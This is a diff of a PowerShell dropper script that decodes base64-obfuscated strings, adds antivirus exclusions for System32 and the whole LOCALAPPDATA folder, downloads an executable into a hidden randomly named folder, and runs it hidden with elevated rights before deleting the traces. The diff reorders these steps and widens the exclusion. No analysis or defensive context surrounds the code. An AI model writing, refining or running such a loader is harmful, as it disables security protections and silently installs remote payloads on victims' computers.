@@ -12,11 +12,6 @@ $stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase6
 $directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
 $runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))
 
-$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())  # AppData\Local
-New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
-
-$tempPath = Join-Path $hiddenFolder $updaterExe
-
 function Add-Exclusion {
     param ([string]$Path)
     try {
@@ -24,17 +19,19 @@ function Add-Exclusion {
     } catch {}
 }
 
-# 🛡️ Add exclusions before downloading
-Add-Exclusion -Path $hiddenFolder              # AppData\Local hidden folder
-Add-Exclusion -Path "C:\Windows\System32"      # System32 directory
+Add-Exclusion -Path "C:\Windows\System32"
+Add-Exclusion -Path $env:LOCALAPPDATA
+
+$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
+New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
+
+$tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
-
-    Add-Exclusion -Path $tempPath               # Also exclude the downloaded file
-
+    Add-Exclusion -Path $tempPath
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Remove-Item $hiddenFolder -Recurse -Force
 }
